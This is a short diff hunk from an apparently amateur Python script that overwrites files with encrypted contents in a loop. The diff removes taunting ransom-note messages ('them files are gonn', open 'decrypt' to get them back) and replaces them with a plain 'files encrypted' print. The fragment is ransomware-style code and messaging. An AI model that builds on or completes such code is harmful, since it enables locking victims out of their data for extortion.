@@ -29,8 +29,5 @@ for file in files:
 		thefile.write(contents_encrypted)
 
 
-print("them files are gonn lil bro")
-time.sleep(1)
-print("if u see a file called decrypt")
-time.sleep(2)
-print("open it if u still want them files")
+print("files encrypted")
+
